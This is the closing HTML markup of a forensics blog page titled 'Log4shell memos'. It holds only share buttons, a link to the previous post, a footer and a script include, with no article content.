+<div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f&t=%5b0x08%5d%20Log4shell%20memos" target=_blank rel=noopener aria-label title="Share on hacker news">
+<div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://telegram.me/share/url?text=%5b0x08%5d%20Log4shell%20memos&url=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f" target=_blank rel=noopener aria-label title="Share on telegram">
+<div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+</div>
+</div>
+</a>
+</div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h></span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button next">
+<a href=https://blog.dfir.fi/posts/2021/09/0x07-migration-to-github/>
+<span class=button__text>[0x07] Migration to Github</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</main>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=footer__content>
+<span>&copy; 2021</span>
+<span><a href=https://blog.dfir.fi>Juho Jauhiainen</a></span>
+<span><a href=https://blog.dfir.fi/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
+</div>
+</div>
+<div class=footer__inner>
+<div class=footer__content>
+<span>It's all about forensics</span>
+</div>
+</div>
+</footer>
+</div>
+<script type=text/javascript src=https://blog.dfir.fi/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+</body>
+</html>
